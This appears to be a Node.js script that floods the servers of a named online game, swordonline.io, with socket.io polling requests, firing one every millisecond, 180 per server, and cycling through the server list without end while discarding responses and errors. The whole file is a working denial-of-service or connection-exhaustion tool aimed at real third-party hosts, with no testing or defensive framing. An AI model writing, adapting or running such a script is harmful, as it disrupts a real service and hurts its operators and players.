const https = require("https");

const SERVERS = [
  "na",
  "na-7",
  "na-2",
  "na-3",
  "na-4",
  "na-5",
  "na-6",
  "na-7",
  "na-8",
];
const MAX_PER_SERVER = 180;
const DELAY_MS = 1;

let serverIndex = 0;
let count = 0;
let connections = [];

function sendPoll() {
  if (count >= MAX_PER_SERVER) {
    console.log(
      `\nCompleted 180 requests to ${SERVERS[serverIndex]}\nSwitching to next server...\n`,
    );
    count = 0;
    serverIndex = (serverIndex + 1) % SERVERS.length;
    connections = [];
  }

  const server = SERVERS[serverIndex];
  const url = `https://${server}.swordonline.io/socket.io/?EIO=3&transport=polling`;

  const req = https.get(url, (res) => {
    res.on("data", () => {});
    res.on("end", () => {});
  });

  req.on("error", () => {});

  connections.push(req);

  count++;
  if (count % 10 === 0) {
    console.log(`Sent ${count} requests to ${server}`);
  }

  setTimeout(sendPoll, DELAY_MS);
}

sendPoll();
